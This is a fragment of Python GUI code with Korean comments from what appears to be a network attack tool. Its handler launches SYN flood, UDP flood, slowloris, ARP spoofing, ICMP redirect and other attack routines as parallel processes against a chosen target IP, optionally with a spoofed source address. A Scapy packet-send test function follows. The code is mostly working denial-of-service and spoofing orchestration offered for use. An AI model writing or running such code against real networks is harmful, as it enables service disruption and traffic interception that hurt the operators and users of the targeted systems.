        # IP 스푸핑 설정 확인
        spoof_ip = None
        if self.spoof_ip_checkbox.isChecked():
            spoof_ip = self.spoof_ip_input.text().strip()
            if not is_valid_ip(spoof_ip):
                QMessageBox.warning(self, "잘못된 스푸핑 IP", "올바른 스푸핑 IP 주소를 입력하세요.")
                return
        
        if self.is_valid_ip(target_ip):
            if spoof_ip:
                QMessageBox.information(self, "트래픽 생성", f"트래픽 생성이 시작됩니다. 소스 IP가 {spoof_ip}로 변조됩니다.")
            else:
                QMessageBox.information(self, "트래픽 생성", "트래픽 생성이 시작됩니다.")
            
            self.cmd_process = subprocess.Popen("start cmd /k echo 트래픽 생성 중...", shell=True)

            attack_methods = []
            if self.syn_flood_checkbox.isChecked():
                attack_methods.append((standalone_syn_flood, (target_ip, packet_count, packet_size, self.stop_flag, spoof_ip)))
            if self.udp_flood_checkbox.isChecked():
                attack_methods.append((standalone_udp_flood, (target_ip, packet_count, packet_size, self.stop_flag, spoof_ip)))
            if self.http_slowloris_checkbox.isChecked():
                attack_methods.append((standalone_http_slowloris, (target_ip, packet_count, packet_size, self.stop_flag, spoof_ip)))
            if self.tcp_handshake_misuse_checkbox.isChecked():
                attack_methods.append((standalone_tcp_handshake_misuse, (target_ip, packet_count, packet_size, self.stop_flag, spoof_ip)))
            if self.ssl_traffic_checkbox.isChecked():
                attack_methods.append((standalone_ssl_traffic, (target_ip, packet_count, packet_size, self.stop_flag)))
            if self.http_request_modification_checkbox.isChecked():
                attack_methods.append((standalone_http_request_modification, (target_ip, packet_count, packet_size, self.stop_flag)))
            if self.arp_spoofing_checkbox.isChecked():
                # 스푸핑할 IP로는 spoof_ip를 사용하거나, 없는 경우 기본값 사용
                spoof_gateway_ip = spoof_ip if spoof_ip else "192.168.1.1"
                attack_methods.append((standalone_arp_spoof, (target_ip, spoof_gateway_ip, self.stop_flag)))
            if self.icmp_redirect_checkbox.isChecked():
                # ICMP 리다이렉트를 위한 추가 입력 필요
                new_gateway_ip = "192.168.1.254"  # 예시 IP, 실제로는 사용자 입력 필요
                attack_methods.append((standalone_icmp_redirect, (target_ip, new_gateway_ip, self.stop_flag)))

            for method, args in attack_methods:
                process = Process(target=method, args=args)
                process.start()
                self.processes.append(process)
            
            if spoof_ip:
                print(f"패킷이 {target_ip}로 전송되었습니다. (소스 IP: {spoof_ip} - 변조됨)")
            else:
                print(f"패킷이 {target_ip}로 전송되었습니다.")
        else:
            QMessageBox.warning(self, "잘못된 IP", "올바른 IP 주소를 입력하세요.")
            self.ip_input.clear()

def test_packet_send(target_ip="127.0.0.1", method="scapy"):
    """패킷 전송 테스트 함수"""
    print(f"패킷 전송 테스트 시작 ({method} 사용)")
    
    try:
        if method == "socket":
            # 일반 소켓 사용
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"TEST", (target_ip, 12345))
            s.close()
            print("소켓 테스트 완료")
            return True
            
        elif method == "scapy":
            # Scapy 사용
            iface = conf.iface  # Scapy 기본 인터페이스 사용
            print(f"Scapy 사용 인터페이스: {iface}")
            packet = IP(dst=target_ip)/UDP(dport=12345)/b"TEST"
            send(packet, iface=iface, verbose=1)  # verbose=1로 설정하여 전송 정보 표시
            print("Scapy 테스트 완료")
            return True
    except Exception as e:
        print(f"패킷 전송 테스트 오류: {str(e)}")
        return False 